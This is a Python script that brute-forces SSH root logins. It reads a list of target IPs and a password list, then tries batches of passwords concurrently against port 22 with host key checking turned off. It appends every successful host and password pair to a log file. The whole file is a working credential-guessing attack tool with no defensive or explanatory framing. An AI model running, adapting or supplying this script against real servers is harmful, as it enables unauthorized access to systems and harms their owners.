# coding: utf-8

import asyncio, asyncssh, math


async def run_client(host, password):
    async with asyncssh.connect(host=host, port=22, username='root', password=password, known_hosts=None) as conn:
        return await conn.run("echo '%s'" % password)


async def run_multiple_clients(host, passwords):
    tasks = (run_client(host, password) for password in passwords)
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, result in enumerate(results, 1):
        if isinstance(result, Exception):
            print('Task %d failed: %s' % (i, str(result)))
        elif result.exit_status != 0:
            print('Task %d exited with status %s:' % (i, result.exit_status))
            print(result.stderr, end='')
        else:
            print('Task %d succeeded:' + result.stdout)
            with open('log.txt', 'a') as f:
                f.write(host + ':' + result.stdout)


if __name__ == '__main__':
    base = 10
    with open('pwd.txt', 'r') as f:
        passwords = [password.strip() for password in f.readlines()]
    with open('async_ip.txt', 'r') as f:
        hosts = [host.strip() for host in f.readlines()]
    count = math.ceil(len(passwords) / base)
    loop = asyncio.get_event_loop()
    for host in hosts:
        for time in range(int(count)):
            loop.run_until_complete(run_multiple_clients(host, passwords[time * base: time * base + base]))
    loop.close()
